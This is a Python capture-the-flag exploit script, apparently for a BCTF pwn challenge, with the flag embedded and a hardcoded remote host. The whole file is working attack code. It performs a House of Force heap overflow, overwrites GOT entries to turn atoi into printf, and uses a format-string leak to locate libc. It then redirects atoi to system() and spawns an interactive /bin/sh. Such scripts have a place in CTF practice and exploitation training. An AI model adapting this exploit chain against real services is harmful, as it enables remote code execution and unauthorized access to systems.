#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import re

#host = "10.211.55.16"
#port = 8888

host = "104.199.132.199"
port = 1970


# BCTF{3asy_h0uSe_oooof_f0rce}
sock = make_conn(host,port)

def new(data):
    recvuntil(sock,"option--->>")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(len(data)))
    recvuntil(sock,":")
    sendline(sock,data)

def edit(data,index):
    recvuntil(sock,"option--->>")
    sendline(sock,"3")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,":")
    sendline(sock,data)


recvuntil(sock,":")
sock.send("a"*0x40)
data =  recvuntil(sock,":")
heap =  unpack32(data.split("a"*0x40)[1][:4])-0x8
sock.send("a"*0x40)
recvuntil(sock,":")
sendline(sock,pack32(0xffffffff))

top = heap + 0xd8
nb = 0x804b0a0 - 4 - top - 0x8 -4
atoigot = 0x804b03c
setvbufgot = 0x804b034
setvbufoff = 0x65d30
printf = 0x80484d6
payload = pack32(0x64)*10
payload += pack32(heap+0x98)
payload += pack32(heap+0x8)
payload += pack32(0)*20
payload += pack32(atoigot)*2
recvuntil(sock,"option--->>")
sendline(sock,"1")
recvuntil(sock,":")
sendline(sock,str(nb))
new(payload)
edit(pack32(printf),0)
recvuntil(sock,"option--->>")
payload = pack32(setvbufgot)
payload += "%6$s"
sendline(sock,payload)
data = recvuntil(sock,"Invalid").split("Invalid")[0]
setvbufaddr = unpack32(data[5:9])
libc = setvbufaddr - setvbufoff
system = libc + 0x40190
print hex(libc)
recvuntil(sock,"option--->>")
sendline(sock,"ddd")
recvuntil(sock,":")
sendline(sock,"0")
recvuntil(sock,":")
sendline(sock,pack32(system))
recvuntil(sock,"option--->>")
sendline(sock,"/bin/sh")
print "Get shell :"
inter(sock)
